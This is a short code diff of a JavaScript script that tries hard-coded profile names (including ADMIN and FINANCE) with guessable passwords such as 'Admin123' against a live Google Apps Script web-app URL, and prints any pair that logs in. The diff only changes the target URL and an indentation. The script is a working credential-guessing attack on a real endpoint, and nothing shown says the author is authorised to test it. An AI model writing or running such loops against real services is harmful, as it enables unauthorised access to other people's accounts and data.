@@ -22,14 +22,14 @@ async function testLogin(url, profile, password) {
 }
 
 async function run() {
-  const url = 'https://script.google.com/macros/s/AKfycbzECrJpWg8d8CgaCdg3f1fFymsPulMLBv82vJctEAXmYvNXSG0DGWsZU8bGXwIOmNJ_/exec';
+  const url = 'https://script.google.com/macros/s/AKfycbxGz2TcoduCMDXzrvy2Rr0P68oOZKmMiBD0Eun9BuZj98C57jBGdUQPaota2nZ0PkA2/exec';
   const profiles = ['QSMS', 'WFG', 'FINANCE', 'ADMIN'];
   const passwords = ['Qsms123', 'Wfg123', 'Finance123', 'Admin123'];
 
   for (const p of profiles) {
     for (const pwd of passwords) {
       if (await testLogin(url, p, pwd)) {
-         console.log(`!!! VALID CREDENTIALS FOUND !!! ${p} / ${pwd}`);
+        console.log(`!!! VALID CREDENTIALS FOUND !!! ${p} / ${pwd}`);
       }
     }
   }
